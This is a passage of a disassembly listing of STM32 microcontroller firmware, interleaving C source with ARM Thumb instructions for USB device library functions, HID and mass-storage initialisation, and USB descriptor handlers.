 800c23a:	7dfb      	ldrb	r3, [r7, #23]
 800c23c:	3301      	adds	r3, #1
 800c23e:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c240:	7dfb      	ldrb	r3, [r7, #23]
 800c242:	68ba      	ldr	r2, [r7, #8]
 800c244:	4413      	add	r3, r2
 800c246:	2203      	movs	r2, #3
 800c248:	701a      	strb	r2, [r3, #0]
  idx++;
 800c24a:	7dfb      	ldrb	r3, [r7, #23]
 800c24c:	3301      	adds	r3, #1
 800c24e:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c250:	e013      	b.n	800c27a <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c252:	7dfb      	ldrb	r3, [r7, #23]
 800c254:	68ba      	ldr	r2, [r7, #8]
 800c256:	4413      	add	r3, r2
 800c258:	693a      	ldr	r2, [r7, #16]
 800c25a:	7812      	ldrb	r2, [r2, #0]
 800c25c:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c25e:	693b      	ldr	r3, [r7, #16]
 800c260:	3301      	adds	r3, #1
 800c262:	613b      	str	r3, [r7, #16]
    idx++;
 800c264:	7dfb      	ldrb	r3, [r7, #23]
 800c266:	3301      	adds	r3, #1
 800c268:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c26a:	7dfb      	ldrb	r3, [r7, #23]
 800c26c:	68ba      	ldr	r2, [r7, #8]
 800c26e:	4413      	add	r3, r2
 800c270:	2200      	movs	r2, #0
 800c272:	701a      	strb	r2, [r3, #0]
    idx++;
 800c274:	7dfb      	ldrb	r3, [r7, #23]
 800c276:	3301      	adds	r3, #1
 800c278:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c27a:	693b      	ldr	r3, [r7, #16]
 800c27c:	781b      	ldrb	r3, [r3, #0]
 800c27e:	2b00      	cmp	r3, #0
 800c280:	d1e7      	bne.n	800c252 <USBD_GetString+0x52>
 800c282:	e000      	b.n	800c286 <USBD_GetString+0x86>
    return;
 800c284:	bf00      	nop
  }
}
 800c286:	3718      	adds	r7, #24
 800c288:	46bd      	mov	sp, r7
 800c28a:	bd80      	pop	{r7, pc}

0800c28c <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c28c:	b480      	push	{r7}
 800c28e:	b085      	sub	sp, #20
 800c290:	af00      	add	r7, sp, #0
 800c292:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c294:	2300      	movs	r3, #0
 800c296:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c298:	687b      	ldr	r3, [r7, #4]
 800c29a:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c29c:	e005      	b.n	800c2aa <USBD_GetLen+0x1e>
  {
    len++;
 800c29e:	7bfb      	ldrb	r3, [r7, #15]
 800c2a0:	3301      	adds	r3, #1
 800c2a2:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c2a4:	68bb      	ldr	r3, [r7, #8]
 800c2a6:	3301      	adds	r3, #1
 800c2a8:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c2aa:	68bb      	ldr	r3, [r7, #8]
 800c2ac:	781b      	ldrb	r3, [r3, #0]
 800c2ae:	2b00      	cmp	r3, #0
 800c2b0:	d1f5      	bne.n	800c29e <USBD_GetLen+0x12>
  }

  return len;
 800c2b2:	7bfb      	ldrb	r3, [r7, #15]
}
 800c2b4:	4618      	mov	r0, r3
 800c2b6:	3714      	adds	r7, #20
 800c2b8:	46bd      	mov	sp, r7
 800c2ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c2be:	4770      	bx	lr

0800c2c0 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c2c0:	b580      	push	{r7, lr}
 800c2c2:	b084      	sub	sp, #16
 800c2c4:	af00      	add	r7, sp, #0
 800c2c6:	60f8      	str	r0, [r7, #12]
 800c2c8:	60b9      	str	r1, [r7, #8]
 800c2ca:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c2cc:	68fb      	ldr	r3, [r7, #12]
 800c2ce:	2202      	movs	r2, #2
 800c2d0:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c2d4:	68fb      	ldr	r3, [r7, #12]
 800c2d6:	687a      	ldr	r2, [r7, #4]
 800c2d8:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c2da:	68fb      	ldr	r3, [r7, #12]
 800c2dc:	687a      	ldr	r2, [r7, #4]
 800c2de:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c2e0:	687b      	ldr	r3, [r7, #4]
 800c2e2:	68ba      	ldr	r2, [r7, #8]
 800c2e4:	2100      	movs	r1, #0
 800c2e6:	68f8      	ldr	r0, [r7, #12]
 800c2e8:	f000 fdbc 	bl	800ce64 <USBD_LL_Transmit>

  return USBD_OK;
 800c2ec:	2300      	movs	r3, #0
}
 800c2ee:	4618      	mov	r0, r3
 800c2f0:	3710      	adds	r7, #16
 800c2f2:	46bd      	mov	sp, r7
 800c2f4:	bd80      	pop	{r7, pc}

0800c2f6 <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c2f6:	b580      	push	{r7, lr}
 800c2f8:	b084      	sub	sp, #16
 800c2fa:	af00      	add	r7, sp, #0
 800c2fc:	60f8      	str	r0, [r7, #12]
 800c2fe:	60b9      	str	r1, [r7, #8]
 800c300:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c302:	687b      	ldr	r3, [r7, #4]
 800c304:	68ba      	ldr	r2, [r7, #8]
 800c306:	2100      	movs	r1, #0
 800c308:	68f8      	ldr	r0, [r7, #12]
 800c30a:	f000 fdab 	bl	800ce64 <USBD_LL_Transmit>

  return USBD_OK;
 800c30e:	2300      	movs	r3, #0
}
 800c310:	4618      	mov	r0, r3
 800c312:	3710      	adds	r7, #16
 800c314:	46bd      	mov	sp, r7
 800c316:	bd80      	pop	{r7, pc}

0800c318 <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c318:	b580      	push	{r7, lr}
 800c31a:	b084      	sub	sp, #16
 800c31c:	af00      	add	r7, sp, #0
 800c31e:	60f8      	str	r0, [r7, #12]
 800c320:	60b9      	str	r1, [r7, #8]
 800c322:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c324:	68fb      	ldr	r3, [r7, #12]
 800c326:	2203      	movs	r2, #3
 800c328:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c32c:	68fb      	ldr	r3, [r7, #12]
 800c32e:	687a      	ldr	r2, [r7, #4]
 800c330:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c334:	68fb      	ldr	r3, [r7, #12]
 800c336:	687a      	ldr	r2, [r7, #4]
 800c338:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c33c:	687b      	ldr	r3, [r7, #4]
 800c33e:	68ba      	ldr	r2, [r7, #8]
 800c340:	2100      	movs	r1, #0
 800c342:	68f8      	ldr	r0, [r7, #12]
 800c344:	f000 fdc6 	bl	800ced4 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c348:	2300      	movs	r3, #0
}
 800c34a:	4618      	mov	r0, r3
 800c34c:	3710      	adds	r7, #16
 800c34e:	46bd      	mov	sp, r7
 800c350:	bd80      	pop	{r7, pc}

0800c352 <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c352:	b580      	push	{r7, lr}
 800c354:	b084      	sub	sp, #16
 800c356:	af00      	add	r7, sp, #0
 800c358:	60f8      	str	r0, [r7, #12]
 800c35a:	60b9      	str	r1, [r7, #8]
 800c35c:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c35e:	687b      	ldr	r3, [r7, #4]
 800c360:	68ba      	ldr	r2, [r7, #8]
 800c362:	2100      	movs	r1, #0
 800c364:	68f8      	ldr	r0, [r7, #12]
 800c366:	f000 fdb5 	bl	800ced4 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c36a:	2300      	movs	r3, #0
}
 800c36c:	4618      	mov	r0, r3
 800c36e:	3710      	adds	r7, #16
 800c370:	46bd      	mov	sp, r7
 800c372:	bd80      	pop	{r7, pc}

0800c374 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c374:	b580      	push	{r7, lr}
 800c376:	b082      	sub	sp, #8
 800c378:	af00      	add	r7, sp, #0
 800c37a:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c37c:	687b      	ldr	r3, [r7, #4]
 800c37e:	2204      	movs	r2, #4
 800c380:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c384:	2300      	movs	r3, #0
 800c386:	2200      	movs	r2, #0
 800c388:	2100      	movs	r1, #0
 800c38a:	6878      	ldr	r0, [r7, #4]
 800c38c:	f000 fd6a 	bl	800ce64 <USBD_LL_Transmit>

  return USBD_OK;
 800c390:	2300      	movs	r3, #0
}
 800c392:	4618      	mov	r0, r3
 800c394:	3708      	adds	r7, #8
 800c396:	46bd      	mov	sp, r7
 800c398:	bd80      	pop	{r7, pc}

0800c39a <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c39a:	b580      	push	{r7, lr}
 800c39c:	b082      	sub	sp, #8
 800c39e:	af00      	add	r7, sp, #0
 800c3a0:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c3a2:	687b      	ldr	r3, [r7, #4]
 800c3a4:	2205      	movs	r2, #5
 800c3a6:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c3aa:	2300      	movs	r3, #0
 800c3ac:	2200      	movs	r2, #0
 800c3ae:	2100      	movs	r1, #0
 800c3b0:	6878      	ldr	r0, [r7, #4]
 800c3b2:	f000 fd8f 	bl	800ced4 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c3b6:	2300      	movs	r3, #0
}
 800c3b8:	4618      	mov	r0, r3
 800c3ba:	3708      	adds	r7, #8
 800c3bc:	46bd      	mov	sp, r7
 800c3be:	bd80      	pop	{r7, pc}

0800c3c0 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c3c0:	b580      	push	{r7, lr}
 800c3c2:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c3c4:	2200      	movs	r2, #0
 800c3c6:	4912      	ldr	r1, [pc, #72]	; (800c410 <MX_USB_DEVICE_Init+0x50>)
 800c3c8:	4812      	ldr	r0, [pc, #72]	; (800c414 <MX_USB_DEVICE_Init+0x54>)
 800c3ca:	f7fe fd68 	bl	800ae9e <USBD_Init>
 800c3ce:	4603      	mov	r3, r0
 800c3d0:	2b00      	cmp	r3, #0
 800c3d2:	d001      	beq.n	800c3d8 <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c3d4:	f7f4 fc7e 	bl	8000cd4 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c3d8:	490f      	ldr	r1, [pc, #60]	; (800c418 <MX_USB_DEVICE_Init+0x58>)
 800c3da:	480e      	ldr	r0, [pc, #56]	; (800c414 <MX_USB_DEVICE_Init+0x54>)
 800c3dc:	f7fe fd8f 	bl	800aefe <USBD_RegisterClass>
 800c3e0:	4603      	mov	r3, r0
 800c3e2:	2b00      	cmp	r3, #0
 800c3e4:	d001      	beq.n	800c3ea <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c3e6:	f7f4 fc75 	bl	8000cd4 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c3ea:	490c      	ldr	r1, [pc, #48]	; (800c41c <MX_USB_DEVICE_Init+0x5c>)
 800c3ec:	4809      	ldr	r0, [pc, #36]	; (800c414 <MX_USB_DEVICE_Init+0x54>)
 800c3ee:	f7fc fca5 	bl	8008d3c <USBD_CUSTOM_HID_RegisterInterface>
 800c3f2:	4603      	mov	r3, r0
 800c3f4:	2b00      	cmp	r3, #0
 800c3f6:	d001      	beq.n	800c3fc <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c3f8:	f7f4 fc6c 	bl	8000cd4 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c3fc:	4805      	ldr	r0, [pc, #20]	; (800c414 <MX_USB_DEVICE_Init+0x54>)
 800c3fe:	f7fe fdb4 	bl	800af6a <USBD_Start>
 800c402:	4603      	mov	r3, r0
 800c404:	2b00      	cmp	r3, #0
 800c406:	d001      	beq.n	800c40c <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c408:	f7f4 fc64 	bl	8000cd4 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c40c:	bf00      	nop
 800c40e:	bd80      	pop	{r7, pc}
 800c410:	200001ac 	.word	0x200001ac
 800c414:	200003c0 	.word	0x200003c0
 800c418:	2000002c 	.word	0x2000002c
 800c41c:	2000019c 	.word	0x2000019c

0800c420 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c420:	b580      	push	{r7, lr}
 800c422:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c424:	2200      	movs	r2, #0
 800c426:	4912      	ldr	r1, [pc, #72]	; (800c470 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c428:	4812      	ldr	r0, [pc, #72]	; (800c474 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c42a:	f7fe fd38 	bl	800ae9e <USBD_Init>
 800c42e:	4603      	mov	r3, r0
 800c430:	2b00      	cmp	r3, #0
 800c432:	d001      	beq.n	800c438 <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c434:	f7f4 fc4e 	bl	8000cd4 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c438:	490f      	ldr	r1, [pc, #60]	; (800c478 <MX_USB_DEVICE_Init_MSC+0x58>)
 800c43a:	480e      	ldr	r0, [pc, #56]	; (800c474 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c43c:	f7fe fd5f 	bl	800aefe <USBD_RegisterClass>
 800c440:	4603      	mov	r3, r0
 800c442:	2b00      	cmp	r3, #0
 800c444:	d001      	beq.n	800c44a <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c446:	f7f4 fc45 	bl	8000cd4 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c44a:	490c      	ldr	r1, [pc, #48]	; (800c47c <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c44c:	4809      	ldr	r0, [pc, #36]	; (800c474 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c44e:	f7fc ff27 	bl	80092a0 <USBD_MSC_RegisterStorage>
 800c452:	4603      	mov	r3, r0
 800c454:	2b00      	cmp	r3, #0
 800c456:	d001      	beq.n	800c45c <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c458:	f7f4 fc3c 	bl	8000cd4 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c45c:	4805      	ldr	r0, [pc, #20]	; (800c474 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c45e:	f7fe fd84 	bl	800af6a <USBD_Start>
 800c462:	4603      	mov	r3, r0
 800c464:	2b00      	cmp	r3, #0
 800c466:	d001      	beq.n	800c46c <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c468:	f7f4 fc34 	bl	8000cd4 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c46c:	bf00      	nop
 800c46e:	bd80      	pop	{r7, pc}
 800c470:	200001ac 	.word	0x200001ac
 800c474:	2000069c 	.word	0x2000069c
 800c478:	200000a8 	.word	0x200000a8
 800c47c:	20000220 	.word	0x20000220

0800c480 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c480:	b480      	push	{r7}
 800c482:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c484:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c486:	4618      	mov	r0, r3
 800c488:	46bd      	mov	sp, r7
 800c48a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c48e:	4770      	bx	lr

0800c490 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c490:	b480      	push	{r7}
 800c492:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c494:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c496:	4618      	mov	r0, r3
 800c498:	46bd      	mov	sp, r7
 800c49a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c49e:	4770      	bx	lr

0800c4a0 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c4a0:	b580      	push	{r7, lr}
 800c4a2:	b082      	sub	sp, #8
 800c4a4:	af00      	add	r7, sp, #0
 800c4a6:	4603      	mov	r3, r0
 800c4a8:	460a      	mov	r2, r1
 800c4aa:	71fb      	strb	r3, [r7, #7]
 800c4ac:	4613      	mov	r3, r2
 800c4ae:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c4b0:	4803      	ldr	r0, [pc, #12]	; (800c4c0 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c4b2:	f7fc fbd1 	bl	8008c58 <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c4b6:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c4b8:	4618      	mov	r0, r3
 800c4ba:	3708      	adds	r7, #8
 800c4bc:	46bd      	mov	sp, r7
 800c4be:	bd80      	pop	{r7, pc}
 800c4c0:	200003c0 	.word	0x200003c0

0800c4c4 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4c4:	b480      	push	{r7}
 800c4c6:	b083      	sub	sp, #12
 800c4c8:	af00      	add	r7, sp, #0
 800c4ca:	4603      	mov	r3, r0
 800c4cc:	6039      	str	r1, [r7, #0]
 800c4ce:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c4d0:	683b      	ldr	r3, [r7, #0]
 800c4d2:	2212      	movs	r2, #18
 800c4d4:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c4d6:	4b06      	ldr	r3, [pc, #24]	; (800c4f0 <USBD_FS_DeviceDescriptor+0x2c>)
 800c4d8:	681b      	ldr	r3, [r3, #0]
 800c4da:	2b01      	cmp	r3, #1
 800c4dc:	d101      	bne.n	800c4e2 <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c4de:	4b05      	ldr	r3, [pc, #20]	; (800c4f4 <USBD_FS_DeviceDescriptor+0x30>)
 800c4e0:	e000      	b.n	800c4e4 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c4e2:	4b05      	ldr	r3, [pc, #20]	; (800c4f8 <USBD_FS_DeviceDescriptor+0x34>)
}
 800c4e4:	4618      	mov	r0, r3
 800c4e6:	370c      	adds	r7, #12
 800c4e8:	46bd      	mov	sp, r7
 800c4ea:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c4ee:	4770      	bx	lr
 800c4f0:	20000978 	.word	0x20000978
 800c4f4:	200001cc 	.word	0x200001cc
 800c4f8:	200001e0 	.word	0x200001e0

0800c4fc <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4fc:	b480      	push	{r7}
 800c4fe:	b083      	sub	sp, #12
 800c500:	af00      	add	r7, sp, #0
 800c502:	4603      	mov	r3, r0
 800c504:	6039      	str	r1, [r7, #0]
 800c506:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c508:	683b      	ldr	r3, [r7, #0]
 800c50a:	2204      	movs	r2, #4
 800c50c:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c50e:	4b03      	ldr	r3, [pc, #12]	; (800c51c <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c510:	4618      	mov	r0, r3
 800c512:	370c      	adds	r7, #12
 800c514:	46bd      	mov	sp, r7
 800c516:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c51a:	4770      	bx	lr
 800c51c:	20000200 	.word	0x20000200

0800c520 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c520:	b580      	push	{r7, lr}
 800c522:	b082      	sub	sp, #8
 800c524:	af00      	add	r7, sp, #0
 800c526:	4603      	mov	r3, r0
 800c528:	6039      	str	r1, [r7, #0]
 800c52a:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c52c:	79fb      	ldrb	r3, [r7, #7]
 800c52e:	2b00      	cmp	r3, #0
 800c530:	d105      	bne.n	800c53e <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c532:	683a      	ldr	r2, [r7, #0]
 800c534:	4907      	ldr	r1, [pc, #28]	; (800c554 <USBD_FS_ProductStrDescriptor+0x34>)
 800c536:	4808      	ldr	r0, [pc, #32]	; (800c558 <USBD_FS_ProductStrDescriptor+0x38>)
 800c538:	f7ff fe62 	bl	800c200 <USBD_GetString>
 800c53c:	e004      	b.n	800c548 <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c53e:	683a      	ldr	r2, [r7, #0]
 800c540:	4904      	ldr	r1, [pc, #16]	; (800c554 <USBD_FS_ProductStrDescriptor+0x34>)
 800c542:	4805      	ldr	r0, [pc, #20]	; (800c558 <USBD_FS_ProductStrDescriptor+0x38>)
 800c544:	f7ff fe5c 	bl	800c200 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c548:	4b02      	ldr	r3, [pc, #8]	; (800c554 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c54a:	4618      	mov	r0, r3
 800c54c:	3708      	adds	r7, #8
 800c54e:	46bd      	mov	sp, r7
 800c550:	bd80      	pop	{r7, pc}
 800c552:	bf00      	nop
 800c554:	2000097c 	.word	0x2000097c
 800c558:	0800d244 	.word	0x0800d244

0800c55c <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c55c:	b580      	push	{r7, lr}
 800c55e:	b082      	sub	sp, #8
 800c560:	af00      	add	r7, sp, #0
 800c562:	4603      	mov	r3, r0
 800c564:	6039      	str	r1, [r7, #0]
 800c566:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c568:	683a      	ldr	r2, [r7, #0]
 800c56a:	4904      	ldr	r1, [pc, #16]	; (800c57c <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c56c:	4804      	ldr	r0, [pc, #16]	; (800c580 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c56e:	f7ff fe47 	bl	800c200 <USBD_GetString>
  return USBD_StrDesc;
 800c572:	4b02      	ldr	r3, [pc, #8]	; (800c57c <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c574:	4618      	mov	r0, r3
 800c576:	3708      	adds	r7, #8
 800c578:	46bd      	mov	sp, r7
 800c57a:	bd80      	pop	{r7, pc}
 800c57c:	2000097c 	.word	0x2000097c
 800c580:	0800d258 	.word	0x0800d258

0800c584 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c584:	b580      	push	{r7, lr}
 800c586:	b082      	sub	sp, #8
 800c588:	af00      	add	r7, sp, #0
 800c58a:	4603      	mov	r3, r0
 800c58c:	6039      	str	r1, [r7, #0]
 800c58e:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c590:	683b      	ldr	r3, [r7, #0]
 800c592:	221a      	movs	r2, #26
 800c594:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c596:	f000 f855 	bl	800c644 <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c59a:	4b02      	ldr	r3, [pc, #8]	; (800c5a4 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c59c:	4618      	mov	r0, r3
 800c59e:	3708      	adds	r7, #8
 800c5a0:	46bd      	mov	sp, r7
 800c5a2:	bd80      	pop	{r7, pc}
 800c5a4:	20000204 	.word	0x20000204

0800c5a8 <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c5a8:	b580      	push	{r7, lr}
 800c5aa:	b082      	sub	sp, #8
